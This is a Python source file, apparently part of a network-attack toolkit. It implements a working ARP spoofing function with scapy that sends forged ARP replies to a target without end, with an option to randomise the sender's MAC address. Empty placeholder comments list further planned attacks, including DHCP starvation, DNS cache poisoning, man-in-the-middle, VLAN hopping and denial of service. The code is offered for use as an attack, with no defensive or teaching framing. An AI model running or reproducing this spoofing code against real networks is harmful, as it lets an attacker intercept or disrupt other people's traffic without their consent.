import core.utils.state as state
from core.utils.logger import log
from core.utils.helpers import scan_types
import core.utils.tools as tools

from scapy.all import *

import nmap
import psutil
import ipaddress

# ARP Spoofing
def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False):

    # initial values
    host_ip = host_tupl[0]
    host_mac = host_tupl[1]
    network_ip = state.current_interface_object['network_ip']

    target_ip = target_tupl[0]
    target_mac = target_tupl[1]

    if target_ip == host_ip:
        return False, "Host and target cannot be the same"
    
    if host_tupl[0] == 'host':
        host_ip = state.current_interface_object['host_ip']
        host_mac = state.current_interface_object['mac']
    
    if randomise_mac:
        host_mac = tools.generate_MAC()

    # craft packet
    eth_l2 = Ether(src=host_mac, dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
    frame = eth_l2 / arp

    while True:
        sendp(frame, iface=state.current_interface_object['interface_name'])
        time.sleep(.2)

    return True, "Spoofing.."

# DHCP starvation

# DHCP Spoofing

# IP spoofing

# MAC Spoofing

# DNS Spoofing

# DNS Cache poisoning

# MITM (Man in the middle)

# VLAN Hopping, STP

# DDos / Dos

